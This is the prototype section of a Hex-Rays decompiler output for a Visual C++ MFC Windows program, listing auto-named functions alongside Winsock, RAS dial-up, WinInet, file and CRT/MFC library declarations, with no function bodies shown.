/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// char *__usercall sub_401000@<eax>(_DWORD *a1@<ebx>);
SIZE_T __cdecl sub_40106B(char a1);
// __int64 __usercall sub_4010C7@<edx:eax>(double a1@<st0>);
// int __usercall sub_4010EE@<eax>(int *a1@<ebx>);
// void __usercall sub_401107(int *a1@<ebx>);
int sub_401127();
__int64 __stdcall sub_4016B6(_DWORD **a1);
void *sub_4017BB();
int __cdecl sub_4017F4(__int16 *a1, _BYTE *a2);
HANDLE __stdcall sub_401891(void **a1, int a2, int a3);
int sub_402175();
int sub_4021B0();
void sub_4021C6();
int sub_4021CD();
int sub_4021EB();
int sub_40225A();
int __cdecl sub_40228D(UINT uExitCode); // idb
int nullsub_1(void); // weak
int __cdecl sub_40229F(void *lp); // idb
int __cdecl sub_4022A5(SIZE_T dwBytes); // idb
_DWORD __cdecl sub_4022AB(_DWORD); // weak
void ***sub_4022D0();
LPVOID __thiscall sub_402310(LPVOID lpMem, char a2);
int sub_402330(void); // weak
int sub_402340();
// int unknown_libname_1(void); weak
// void __cdecl unknown_libname_2(); idb
int sub_402380();
int (__stdcall *sub_4023B0())(int, int, int);
int (*sub_4023C0())(void);
HMODULE sub_4023F0();
UINT __cdecl sub_402420();
// UINT __usercall sub_402460@<eax>(int a1@<ebx>, int a2);
LPVOID __cdecl sub_4024B0(SIZE_T dwBytes);
LPVOID __cdecl sub_402500(LPVOID lpMem, SIZE_T dwBytes);
void __cdecl sub_402540(void *lp);
int __cdecl sub_402590(int a1);
// __int64 __usercall sub_4025B0@<edx:eax>(void (__cdecl *a1)(_DWORD, _DWORD, _DWORD)@<eax>, int a2, ...);
char *sub_402650();
char *sub_4026F0();
BOOL __cdecl sub_402790(int a1, LPCSTR lpExistingFileName, int a3, int a4, LPCSTR lpNewFileName);
DWORD __cdecl sub_4027B0(int a1, LPCSTR lpFileName);
_DWORD *__cdecl sub_402800(int a1, LPCSTR lpFileName);
_DWORD *__cdecl sub_402870(int a1, int a2, int a3, int a4, signed int a5);
int __cdecl sub_4028A0(int a1, LPCSTR lpFileName, int a3, int a4, char a5); // idb
const char *__cdecl sub_402940(int a1, _DWORD *a2);
_DWORD *__cdecl sub_402A20(int a1, int *a2, int a3, unsigned int a4);
BOOL sub_402AE0();
char *__cdecl sub_402B50(int a1, const char *a2, int a3, int a4, int a5);
BOOL __cdecl sub_402BC0(LPCSTR lpFileName, int a2, int a3, HANDLE *a4);
HANDLE __cdecl sub_402D10(HANDLE hFindFile);
CHAR *__cdecl sub_402D30(int a1, LPCSTR lpName);
void *__cdecl sub_402D90(int a1, LPCSTR lpFileName, int a3, int a4, LPCSTR lpAppName, int a6, int a7, LPCSTR lpKeyName, int a9, int a10, LPCSTR lpDefault);
_DWORD *__cdecl sub_402E30(int a1, LPCSTR lpFileName, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
int __cdecl sub_402F10(int a1, _DWORD *a2, int a3, int a4, char a5);
BOOL __cdecl sub_402FF0(int a1, LPCSTR lpFileName, int a3, int a4, LPCSTR lpAppName, int a6, int a7, LPCSTR lpKeyName, int a9, int a10, LPCSTR lpString);
void __cdecl sub_403010(int a1, HANDLE *a2);
int __cdecl sub_403020(int a1, const char *a2, int a3, int a4, char *Str2, int a6, int a7, int a8, int a9, int a10, int a11);
int __stdcall sub_4030F0(int a1, _DWORD *lpMem, int *dwBytes);
_DWORD *__cdecl sub_403650(const void *a1, unsigned int a2);
int __cdecl sub_403690(int a1);
int *__cdecl sub_4036C0(int *a1, int *a2);
void *__cdecl sub_4036F0(const void *a1, signed int a2);
void sub_403730();
void __cdecl sub_4037A0(HANDLE *a1);
LPVOID __cdecl sub_403820(_DWORD *a1);
int __cdecl sub_403850(_DWORD *a1);
void __cdecl sub_403880(int *lp);
int sub_4038E0();
// int unknown_libname_3(void); weak
// void __cdecl unknown_libname_4(); idb
int __stdcall sub_403920(int a1, int a2, int a3);
int __stdcall sub_403960(int a1, int (__stdcall *a2)(_DWORD, _DWORD, _DWORD), int a3);
int __cdecl sub_403980(int a1);
void __cdecl sub_4039A0(_DWORD *a1, int a2, int *a3);
void __cdecl sub_403B20(int a1, int a2, int a3);
unsigned int *__thiscall sub_403B70(unsigned int *lpMem, char a2);
BOOL __thiscall sub_403B90(unsigned int *this);
int sub_403BD0();
// int unknown_libname_5(void); weak
// void __cdecl unknown_libname_6(); idb
_DWORD *__thiscall sub_403C10(_DWORD *this);
void __thiscall sub_403C50(_DWORD *this);
int __stdcall sub_403C60(int a1, char **a2);
_DWORD *__thiscall sub_403D70(_DWORD *this);
void __thiscall sub_403DA0(_DWORD *this);
HINSTANCE __stdcall sub_403DB0(LPCSTR lpFile);
int __thiscall sub_403E10(int this);
void __thiscall sub_403E30(_DWORD *this, LPVOID lpMem);
int sub_403EA0();
int sub_403EF0();
int sub_403F00();
int sub_403F10();
void __cdecl nullsub_5(); // idb
int sub_403F60();
int sub_403FB0();
int sub_403FC0();
int sub_403FD0();
char *__cdecl sub_403FE0(const char *a1);
char *__cdecl sub_404030(char **a1, int a2, int a3);
int __stdcall sub_404060(int a1, int a2, int a3);
int __stdcall sub_404080(int a1, int a2, int a3);
int __stdcall sub_4040C0(int a1, int a2, int a3);
int __cdecl sub_4040E0(char *a1, unsigned int a2, char *a3);
void __stdcall sub_404140(int a1, int a2, unsigned int a3);
int __thiscall sub_404190(_DWORD *this, int a2);
int __stdcall sub_404B60(int *a1, int a2, int a3, int a4, int a5, char a6, int a7);
void __thiscall sub_404BB0(_DWORD *this);
_DWORD *__thiscall sub_404BE0(_DWORD *this);
void __stdcall sub_404C20(int a1, _BYTE *a2, unsigned int a3);
int __thiscall sub_404C70(int this, char *a2);
unsigned int __thiscall sub_404D60(_DWORD *this, char *a2, unsigned int a3);
_DWORD *__cdecl sub_404E20(int a1);
int __cdecl sub_404EA0(int *a1, int a2);
int __cdecl sub_405000(int a1);
unsigned int __cdecl sub_405130(int a1, void *a2, unsigned int a3);
int __cdecl sub_4051B0(int a1, int a2);
unsigned int __cdecl sub_4054E0(_DWORD *a1, int a2);
int __cdecl sub_405650(_DWORD *a1, int a2);
int __cdecl sub_405A80(unsigned int a1, unsigned __int8 *a2, unsigned int a3);
_WORD *__cdecl sub_405BB0(int a1);
_BYTE *__cdecl sub_405C20(int a1, _BYTE *a2, int a3, int a4);
_WORD *__cdecl sub_405CC0(int a1, _BYTE *a2, int a3, int a4);
unsigned int __cdecl sub_405EB0(_DWORD *a1, int *a2);
int __cdecl sub_4060F0(int a1, int a2, int a3);
__int16 __cdecl sub_4061D0(_DWORD *a1, int *a2);
unsigned int __cdecl sub_406400(_WORD *a1, int a2, int a3);
int __cdecl sub_406480(int a1);
int __cdecl sub_4064F0(_WORD *a1, int a2, int a3);
int __cdecl sub_4065E0(int a1, int a2, int a3, int a4);
int __cdecl sub_406850(int a1, unsigned int a2, int a3);
int __cdecl sub_406DD0(int a1, int a2, int a3);
BOOL __cdecl sub_407210(int a1);
unsigned int __cdecl sub_407290(unsigned int a1, int a2);
int __cdecl sub_4072B0(int a1);
_BYTE *__cdecl sub_407330(_DWORD *a1, _BYTE *a2, int a3, int a4);
void sub_4073E0();
int __cdecl sub_4073F0(_DWORD *a1, int a2, LPCSTR *a3);
DWORD __cdecl sub_407450(HRASCONN a1);
_DWORD *__thiscall sub_4074D0(_DWORD *this);
int __thiscall sub_407550(SOCKET *this);
BOOL sub_4075C0();
int __thiscall sub_4075D0(int this);
int sub_407670();
// int unknown_libname_8(void); weak
// void __cdecl unknown_libname_9(); idb
int __stdcall sub_4076B0(int a1, int a2, int a3);
int __stdcall sub_4076D0(int a1, int a2, int a3);
_DWORD *__cdecl sub_407710(const void *a1, unsigned int a2);
int __stdcall sub_407760(int a1, int a2, int a3);
void sub_407790();
_DWORD *__thiscall sub_4077A0(_DWORD *this);
void __thiscall sub_4077D0(CDaoRecordset *this);
BOOL __thiscall sub_407840(HINTERNET *this);
HINTERNET __thiscall sub_407890(HINTERNET *this);
// void __thiscall CDaoRecordset::ResetCursor(CDaoRecordset *__hidden this); idb
BOOL __thiscall sub_4078D0(int this, HINTERNET hInternet);
HINTERNET __thiscall sub_407940(HINTERNET *this);
int __thiscall sub_407960(HINTERNET *this, LPCSTR lpszObjectName, _DWORD *a3);
_DWORD *__thiscall sub_407DB0(_DWORD *this);
LPVOID __thiscall sub_407DD0(_DWORD *this, signed int a2);
LPVOID __thiscall sub_407EA0(int this, signed int a2);
int __thiscall sub_407FB0(int this);
void __thiscall sub_407FD0(_DWORD *this, LPVOID lpMem);
int __thiscall sub_408040(_DWORD *this, _BYTE *Src, signed int Size);
_BYTE *__cdecl sub_4080A0(_BYTE *a1, _BYTE *Src, int Size);
_BYTE *__cdecl sub_408100(_BYTE *a1, unsigned int a2);
int __cdecl sub_408150(_BYTE *a1, int a2, unsigned __int8 a3);
int __cdecl sub_4081A0(char *a1);
char *__cdecl sub_4081C0(char *a1);
void **__cdecl sub_4081E0(int a1, int a2, int a3, int a4, void **a5);
void **__cdecl sub_4082A0(CHAR *lpString, CString *a2);
_BYTE *__cdecl sub_408300(int a1, int a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_408520(_DWORD *this);
int __thiscall sub_408530(SOCKET *this);
BOOL __thiscall sub_408540(SOCKET *this, char *buf, int len);
int __thiscall sub_408570(SOCKET *this, char *buf, int len);
int __thiscall sub_408590(SOCKET *this);
int __thiscall sub_4085B0(SOCKET *this, _DWORD *a2);
_DWORD *__thiscall sub_408620(_DWORD *this);
int __thiscall sub_408640(int this, const char **a2);
void **__thiscall sub_4086A0(void **this, const char **a2);
CString *__thiscall sub_4086D0(void *this, CString *a2);
void __thiscall sub_4087A0(_DWORD *this);
_DWORD *__thiscall sub_408810(_DWORD *this);
void __thiscall sub_408890(int this);
void __thiscall sub_408A20(_DWORD *this);
void __thiscall sub_408A70(void **this);
void __thiscall sub_408B20(int this);
int __thiscall sub_408B80(_DWORD *this, int a2);
int __thiscall sub_408BB0(_DWORD *this, int a2, int a3, int a4);
int __thiscall sub_408CF0(_DWORD *this, int a2);
int __thiscall sub_408D00(_DWORD *this);
void __stdcall __noreturn sub_408D10(int a1);
_DWORD *__thiscall sub_4091A0(_DWORD *this);
int __thiscall sub_409210(SOCKET *this);
int __thiscall sub_409290(SOCKET *this);
int __fastcall sub_409320(int a1, int a2, int a3);
CString *__thiscall sub_409750(_DWORD *this, CString *a2, int a3);
int __thiscall sub_409780(_DWORD *this, int a2, int a3);
void __thiscall sub_4097B0(void *this);
void __thiscall sub_409840(int this, CArchive *a2);
void __thiscall sub_409A10(_DWORD *this);
void __thiscall sub_409A60(int this, CArchive *a2);
LPVOID __thiscall sub_409BF0(LPVOID lpMem, char a2);
_DWORD *__thiscall sub_409C10(_DWORD *lpMem, char a2);
void __thiscall sub_409C30(int this, int a2, int a3);
_DWORD *__stdcall sub_409DB0(_DWORD *a1, _DWORD *a2);
void __cdecl nullsub_3(); // idb
int sub_409E01();
CException *__thiscall sub_409E22(CException *this, int a2, int a3);
_DWORD *__thiscall sub_409E4C(_DWORD *lpMem, char a2);
void __thiscall sub_409E68(_DWORD *this);
CException *__thiscall sub_409E6F(CException *this, int a2, int a3);
_DWORD *__thiscall sub_409E99(_DWORD *lpMem, char a2);
void __thiscall sub_409EB5(_DWORD *this);
BOOL __thiscall sub_409EBC(HDC *this, int x, int y);
BOOL __thiscall sub_409ED0(HDC *this, RECT *lprect);
BOOL __thiscall sub_409EE0(HDC *this, int x, int y, LPCSTR lpString, int c);
int __thiscall sub_409F59(HDC *this, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format);
int __thiscall sub_409FA5(HDC *this, int iEscape, int cjIn, LPCSTR pvIn, LPVOID pvOut);
// _DWORD __stdcall CArchive::operator<<(char); weak
// _DWORD __stdcall CArchive::operator<<(__int16); weak
// _DWORD __stdcall sub_40A00B(_DWORD); weak
BOOL __thiscall sub_40A0C8(HWND *this);
_DWORD *__thiscall sub_40A0E0(_DWORD *lpMem, char a2);
void __thiscall sub_40A0FC(_DWORD *this);
CException *__thiscall sub_40A128(CException *this, int a2, int a3);
_DWORD *__thiscall sub_40A152(_DWORD *lpMem, char a2);
void __thiscall sub_40A16E(_DWORD *this);
CException *__thiscall sub_40A175(CException *this, int a2, int a3);
_DWORD *__thiscall sub_40A19F(_DWORD *lpMem, char a2);
void __thiscall sub_40A1BB(_DWORD *this);
int __stdcall sub_40A1C2(int a1, int a2);
LPVOID __thiscall sub_40A1C8(LPVOID lpMem, char a2);
void *__thiscall sub_40A1E4(int this);
BOOL sub_40A21E();
HMONITOR __stdcall sub_40A2F6(LPCRECT lprc, DWORD dwFlags);
BOOL __stdcall sub_40A3B7(HMONITOR hMonitor, LPMONITORINFO lpmi);
_DWORD *__thiscall sub_40A46E(_DWORD *lpMem, char a2);
int __thiscall sub_40A48A(_DWORD *this);
char *__thiscall sub_40A4D2(char *this, int a2, int a3);
void __thiscall sub_40A50E(int this);
_DWORD *__thiscall sub_40A536(char *this);
void __thiscall sub_40A5C5(int this, _DWORD *a2);
// _DWORD __stdcall unknown_libname_18(_DWORD); weak
_DWORD *__thiscall sub_40A600(_DWORD *lpMem, char a2);
void *__thiscall sub_40A61C(_DWORD *this);
unsigned int *__thiscall sub_40A64E(unsigned int *lpMem, char a2);
BOOL __thiscall sub_40A66A(unsigned int *this);
// int __cdecl atexit(void (__cdecl *)());
// void __cdecl __noreturn _amsg_exit(DWORD NumberOfBytesWritten); idb
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
// char *__cdecl strrchr(const char *Str, int Ch);
// _DWORD __cdecl _local_unwind2(_DWORD, _DWORD); weak
void __cdecl sub_40AD16(LPVOID lpMem);
// void *__cdecl malloc(size_t Size);
LPVOID __cdecl sub_40AE3D(unsigned int a1);
// int __cdecl vsprintf(char *const Buffer, const char *const Format, va_list ArgList);
// int sprintf(char *const Buffer, const char *const Format, ...);
// int __cdecl _strcmpi(const char *String1, const char *String2);
// int __cdecl atol(const char *String);
// int __cdecl atoi(const char *String);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
void *__cdecl sub_40B651(LPVOID lpMem, SIZE_T dwBytes);
// int __cdecl _except_handler3(int, PVOID TargetFrame, int); idb
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// int __cdecl _ismbcdigit(unsigned int C);
// char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
// char *__cdecl strstr(const char *Str, const char *SubStr);
int __cdecl sub_40C072(int a1, int a2);
// char *__cdecl strchr(const char *Str, int Val);
// void *__cdecl memset(void *, int Val, size_t Size);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// void *__cdecl memcpy_0(void *, const void *Src, size_t Size);
// size_t __cdecl wcslen(const wchar_t *String);
// unsigned __int8 *__cdecl _mbsinc(const unsigned __int8 *Ptr);
// size_t __cdecl _mbscspn(const unsigned __int8 *String, const unsigned __int8 *Control);
// size_t __cdecl _mbclen(const unsigned __int8 *String);
// size_t __cdecl strlen(const char *Str);
// int __cdecl _mbsnbcmp(const unsigned __int8 *Str1, const unsigned __int8 *Str2, size_t MaxCount);
unsigned int __cdecl sub_40CCEA(unsigned __int8 *a1, unsigned int a2, unsigned __int8 *a3, int a4);
unsigned int __cdecl sub_40CD05(unsigned __int8 *a1, unsigned int a2, unsigned __int8 *a3, int a4, char **a5);
// _DWORD __cdecl _expandtime(char, _DWORD, _DWORD, _DWORD, _DWORD); weak
void __cdecl sub_40D2CD(char *String1, int a2, _DWORD *a3, _DWORD *a4, int a5);
LPVOID __cdecl sub_40DAD9(LPVOID lpMem, unsigned int a2);
SIZE_T __cdecl sub_40DC3D(_DWORD *lpMem);
int *__cdecl sub_40DD2B(unsigned int a1);
// int *__cdecl _errno();
// unsigned int *__cdecl __doserrno();
// int __cdecl strtol(const char *String, char **EndPtr, int Radix);
int sub_40E198();
// _DWORD __cdecl flsall(_DWORD); weak
void __noreturn sub_40E2C2(); // weak
char __cdecl sub_40EB5D(int a1);
int sub_40EB8A();
int __cdecl sub_40ECD2(int a1);
int *__cdecl sub_40ED68(DWORD NumberOfBytesWritten);
// void __cdecl __noreturn terminate(); idb
// void __usercall __noreturn sub_40F78D(EXCEPTION_POINTERS *a1@<ecx>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
// _DWORD __cdecl __sbh_heap_init(_DWORD); weak
// _DWORD __cdecl __sbh_find_block(_DWORD); weak
_DWORD *__cdecl sub_40F856(_DWORD *a1, int a2);
// _DWORD __cdecl __sbh_alloc_block(_DWORD); weak
// _DWORD __cdecl __sbh_resize_block(_DWORD, _DWORD, _DWORD); weak
void **sub_41032A();
void **__cdecl sub_41046E(void **lpMem);
void __cdecl sub_4104C4(int a1);
unsigned int __cdecl sub_410586(unsigned int a1, void ***a2, unsigned int *a3);
void __cdecl sub_4105DD(int a1, int a2, _BYTE *a3);
int __cdecl sub_410622(unsigned int a1);
int __cdecl sub_41082A(int a1, unsigned int a2, unsigned int a3);
int __cdecl sub_41094E(int a1, _DWORD *a2, _BYTE *a3, unsigned int a4);
// _DWORD __cdecl _lock(_DWORD); weak
// _DWORD __cdecl _unlock(_DWORD); weak
// int __cdecl _callnewh(size_t Size);
int __cdecl sub_411068(FILE *File, char *a2, int a3);
// int __cdecl write_char(int, FILE *File, int); idb
// int __cdecl write_multi_char(int, int, FILE *File, int); idb
// int __cdecl write_string(int, int, FILE *File, int); idb
// _DWORD __cdecl get_int_arg(_DWORD); weak
// _DWORD __cdecl get_int64_arg(_DWORD); weak
// _DWORD __cdecl get_short_arg(_DWORD); weak
// char *__cdecl strcpy(char *Destination, const char *Source);
// char *__cdecl strcat(char *Destination, const char *Source);
// LONG __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
LONG (__stdcall *sub_411E16())(struct _EXCEPTION_POINTERS *ExceptionInfo);
LPTOP_LEVEL_EXCEPTION_FILTER sub_411E27();
// _DWORD __cdecl __crtMessageBoxA(_DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl _ld12cvt(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4133D4(int a1, int a2);
int __cdecl sub_4133EA(int a1, int a2);
int __cdecl sub_413400(int a1, int a2);
int __cdecl sub_41342D(int a1, int a2);
// int __cdecl wctomb(char *MbCh, wchar_t WCh);
// _DWORD __cdecl __strgtold12(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount);
// void __thiscall std::locale::~locale(std::locale *__hidden this); idb
int sub_414D12();
int nullsub_9(void); // weak
void __cdecl sub_414D29(); // idb
int sub_414D5D();
int sub_414D9F();
int sub_414DE1();
// int __stdcall WSACleanup();
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// int __stdcall closesocket(SOCKET s);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// DWORD __stdcall RasGetConnectStatusA(HRASCONN, struct tagRASCONNSTATUSA *);
// DWORD __stdcall RasHangUpA(HRASCONN);
// int __stdcall AfxInitialize(int, unsigned int); idb
void __cdecl sub_414EBA(); // idb
int sub_414ED2();
CString *__thiscall sub_414EF0(LPCSTR *this, CString *a2, void *Size);
CString *__thiscall sub_414F68(const unsigned __int8 **this, CString *a2, unsigned __int8 *Control);
void __thiscall sub_414F93(CString *this, char *Format, va_list a3);
void __cdecl sub_4152E0(CString *a1, char *Format, int a3);
void __stdcall __noreturn sub_41535F(int a1);
_DWORD *__thiscall sub_4153DC(_DWORD *this);
CStringArray *__thiscall sub_4153F3(CStringArray *lpMem, char a2);
// void __thiscall CStringArray::~CStringArray(CStringArray *__hidden this); idb
// void __thiscall CStringArray::SetSize(CStringArray *__hidden this, int, int); idb
int __thiscall sub_4155B8(CStringArray *this, int a2, LPCSTR lpString);
_DWORD *__thiscall sub_41564D(_DWORD *this, int a2);
_DWORD *__thiscall sub_415670(_DWORD *lpMem, char a2);
// int __cdecl sub_41568C(_DWORD); weak
int __thiscall sub_4156AC(_DWORD *this);
_DWORD __stdcall sub_4156D5(_DWORD); // weak
int __thiscall sub_4156EE(_DWORD *this);
// struct CPlex *__stdcall CPlex::Create(struct CPlex **, unsigned int, unsigned int); idb
// void __thiscall CPlex::FreeDataChain(CPlex *__hidden this); idb
_DWORD *__thiscall sub_415748(_DWORD *this, int a2);
_DWORD *__thiscall sub_41576F(_DWORD *lpMem, char a2);
void __thiscall sub_41578B(int this, int a2, int a3);
// int __cdecl sub_4157D0(_DWORD); weak
int __thiscall sub_4157FB(_DWORD *this);
int *__thiscall sub_415824(int this);
_DWORD __stdcall sub_415871(_DWORD); // weak
// _DWORD __stdcall sub_41588A(_DWORD, _DWORD); weak
// void *__thiscall CMapPtrToPtr::GetValueAt(CMapPtrToPtr *__hidden this, void *); idb
int *__thiscall sub_4158EF(_DWORD *this, int a2);
int __thiscall sub_41593F(_DWORD *this, unsigned int a2);
int __thiscall sub_415981(_DWORD *this, _DWORD **a2, _DWORD *a3, _DWORD *a4);
void **sub_4159F3();
int __thiscall sub_415A1B(_DWORD *this, int a2, int a3);
int __stdcall sub_415A52(CObject *a1, int a2); // idb
BOOL __thiscall sub_415AC9(CWinThread *this, int a2);
// struct CWinThread *__stdcall AfxGetThread(); idb
int __thiscall sub_415C66(char *this);
int __thiscall sub_415CE5(_DWORD *this, _DWORD *a2);
int __thiscall sub_415D3E(_DWORD *this);
// int __thiscall CWinThread::OnIdle(CWinThread *__hidden this, int); idb
int __thiscall sub_415E4D(void *this, _DWORD *a2);
int __thiscall sub_415EC8(void *this, HWND *a2);
// _DWORD __stdcall unknown_libname_19(_DWORD, _DWORD); weak
// int __stdcall IsHelpKey(struct tagMSG *); idb
int __thiscall sub_415FED(_DWORD *this, int a2, struct tagMSG *a3);
BOOL __thiscall sub_416152(char *this);
_DWORD *__thiscall sub_416192(_DWORD *this);
int __thiscall sub_4161AC(_DWORD *this);
int __stdcall sub_4161D7(int a1, int a2, int a3, int (__thiscall *a4)(_DWORD, _DWORD), _DWORD *a5, unsigned int a6, _DWORD *a7);
int __thiscall sub_4162DE(void *this, int a2, unsigned int a3, _DWORD *Buf1, _DWORD *a5);
int __stdcall sub_4163ED(int a1);
int __stdcall sub_4163F3(int a1);
int sub_416400();
int sub_416415();
void *sub_41642A();
void *sub_416430();
void *sub_416436();
void *sub_41643C();
void __thiscall sub_416442(void *this);
void *sub_416474();
void *sub_41647A();
// CCmdUI *__thiscall CCmdUI::CCmdUI(CCmdUI *__hidden this); idb
int __thiscall sub_4164A6(int this, int a2);
void __thiscall sub_416598(UINT *this, int a2);
void __thiscall sub_4165EE(UINT_PTR *this, LPCSTR lpNewItem);
void __noreturn sub_416645(); // weak
void *__cdecl sub_41665F(size_t Size);
void __cdecl sub_416688(LPVOID lpMem);
CString *__thiscall sub_416693(CString *this, LPCSTR *a2);
int sub_4166C6();
char *sub_4166D0();
void __cdecl sub_4166EB(); // idb
int sub_4166F5();
char *sub_4166FF();
void __cdecl sub_41671D(); // idb
int sub_416727();
char *sub_416731();
void __cdecl sub_41674F(); // idb
int sub_416759();
char *sub_416763();
void __cdecl sub_416781(); // idb
void *__thiscall sub_41678B(_DWORD *this, int a2);
void __thiscall sub_41680D(_DWORD *lpMem);
volatile LONG *__thiscall sub_416855(void **this);
void __stdcall sub_416886(volatile LONG *lpAddend);
// void __thiscall CString::Empty(CString *__hidden this); idb
void __thiscall sub_41691E(_DWORD *this);
_DWORD *__thiscall sub_416948(_DWORD *this, _DWORD *a2, size_t Size, int a4, int a5);
CString *__thiscall sub_41698C(CString *this, LPCSTR lpString);
// void __thiscall CString::AssignCopy(CString *__hidden this, size_t Size, const char *); idb
void **__thiscall sub_416A0B(void **this, const char **a2);
// int __thiscall CString::operator=(CString *this, LPCSTR lpString); idb
// int __thiscall CString::operator=(CString *this, wchar_t *String); idb
void *__thiscall sub_416AC3(void **this, size_t Size, void *Src, size_t a4, void *a5);
void __thiscall sub_416B01(void **this, size_t Size, void *Src);
void **__thiscall sub_416B60(void **this, CHAR *lpString);
// _DWORD __stdcall CString::operator+=(_DWORD); weak
_DWORD *__thiscall sub_416B9F(_DWORD *this, int a2);
// void __thiscall CString::ReleaseBuffer(CString *__hidden this, int); idb
// char *__thiscall CString::GetBufferSetLength(CString *__hidden this, int); idb
char **sub_416C6C();
// int __thiscall CObject::IsKindOf(CObject *__hidden this, const struct CRuntimeClass *); idb
int __thiscall sub_416C84(_DWORD *this);
void __stdcall sub_416CCA(void *a1);
// CException *__thiscall CException::CException(CException *__hidden this); idb
// CException *__thiscall CException::CException(CException *__hidden this, int); idb
// void __thiscall CException::Delete(CException *__hidden this); idb
int __thiscall sub_416D31(void *this, UINT uType, unsigned int a3);
// AFX_EXCEPTION_LINK *__thiscall AFX_EXCEPTION_LINK::AFX_EXCEPTION_LINK(AFX_EXCEPTION_LINK *__hidden this); idb
// void __stdcall AfxTryCleanup(); idb
int __thiscall sub_416DE2(_DWORD **this, int a2, int a3, int a4);
LONG __thiscall sub_416DF9(int this);
LONG __thiscall sub_416E13(int this);
int __thiscall sub_416E7C(int this, int nCmdShow);
int __thiscall sub_416EA3(int this);
// int __thiscall CWnd::ShowWindow(CWnd *__hidden this, int); idb
struct CObject *__thiscall sub_416EE5(int this);
void __thiscall sub_416F06(int this, int a2);
UINT sub_416F48();
int sub_416F59();
_DWORD *sub_416F63();
// void __cdecl unknown_libname_20(); idb
int sub_416F97();
_DWORD *sub_416FA1();
// void __cdecl unknown_libname_21(); idb
int sub_416FD5();
_DWORD *sub_416FDF();
// void __cdecl unknown_libname_22(); idb
int sub_417013();
_DWORD *sub_41701D();
// void __cdecl unknown_libname_23(); idb
_DWORD *__thiscall sub_417051(_DWORD *this);
CWnd *__thiscall sub_417073(CWnd *lpMem, char a2);
_DWORD *__thiscall sub_41708F(_DWORD *this, int a2);
// void __stdcall _AfxPreInitDialog(struct CWnd *, LPRECT lpRect, unsigned int *); idb
// void __stdcall _AfxPostInitDialog(struct CWnd *, const struct tagRECT *, __int16); idb
// void __stdcall _AfxHandleActivate(struct CWnd *, WPARAM wParam, struct CWnd *); idb
// int __stdcall _AfxHandleSetCursor(struct CWnd *, unsigned int, unsigned int); idb
struct CWnd *__stdcall sub_41722E(struct CWnd *a1, unsigned int a2, CException *a3, int a4, int a5);
int __thiscall sub_417360(void *this);
// struct CHandleMap *__stdcall afxMapHWND(LPVOID lpMem); idb
struct CObject *__stdcall sub_4173F9(void *a1);
void *__stdcall sub_417420(void *a1);
int __thiscall sub_41743E(_DWORD *this, int a2);
unsigned int __thiscall sub_417477(unsigned int *this);
LRESULT __stdcall sub_4174A6(HWND hWnd, CException *Msg, WPARAM wParam, LPARAM lParam);
LRESULT (__stdcall *sub_4174F1())(HWND hWnd, CException *Msg, WPARAM wParam, LPARAM lParam);
LRESULT __stdcall sub_4174F7(HWND hWnd, UINT Msg, WPARAM wParam, unsigned int lParam);
// int __stdcall _AfxGrayBackgroundWndProc(HWND, UINT Msg, HDC hdc, HWND hWnd); idb
LRESULT __stdcall sub_4176D2(int code, HWND wParam, int *lParam);
// void __stdcall AfxHookWindowCreate(struct CWnd *); idb
// int __stdcall AfxUnhookWindowCreate(); idb
BOOL __thiscall sub_417956(struct CWnd *this, int a2, const CHAR *a3, const CHAR *a4, int a5, int a6, int a7, int a8, int a9, HWND a10, HMENU a11, void *a12);
int __stdcall sub_417A1C(int a1);
BOOL __thiscall sub_417A3C(struct CWnd *this, const CHAR *a2, const CHAR *a3, int a4, int *a5, int a6, HMENU a7, void *a8);
// void __thiscall CWnd::~CWnd(CWnd *__hidden this); idb
int __thiscall sub_417C34(int *this);
int __thiscall sub_417C45(int this);
LRESULT __thiscall sub_417C92(void *this, UINT Msg, WPARAM wParam, LPARAM lParam);
char *__thiscall sub_417CD9(char *this);
__int16 __stdcall sub_417CFC(int a1);
int __thiscall sub_417DC4(void *this, int a2, int a3);
void *__stdcall sub_417E76(int a1, int a2);
int __thiscall sub_417ED9(HWND *this, int a2, _DWORD *a3);
int __stdcall sub_417F51(WNDCLASSA *lpWndClass); // idb
int __thiscall sub_418038(HWND *this, ULONG_PTR dwData, UINT uCommand);
void **sub_41811A();
// _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __thiscall sub_418160(void *this, int a2, int a3, int a4);
int __thiscall sub_4181A4(struct CWnd *this, unsigned int a2, WPARAM wParam, unsigned int a4, _DWORD *a5);
CCmdUI *__thiscall sub_418716(CCmdUI *this);
HWND *__thiscall sub_418849(HWND *this);
// HWND __stdcall AfxGetParentOwner(HWND hWnd); idb
struct CObject *__thiscall sub_4188CC(_DWORD *this);
HWND *__thiscall sub_4188F4(HWND *this);
// struct CWnd *__stdcall CWnd::GetDescendantWindow(HWND hDlg, int nIDDlgItem, int); idb
// void __stdcall CWnd::SendMessageToDescendants(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, int, int); idb
int __stdcall sub_418A56(HWND a1, HWND *a2);
int __thiscall sub_418A98(void *this, int a2);
int __stdcall sub_418AC5(HWND hWnd, int a2); // idb
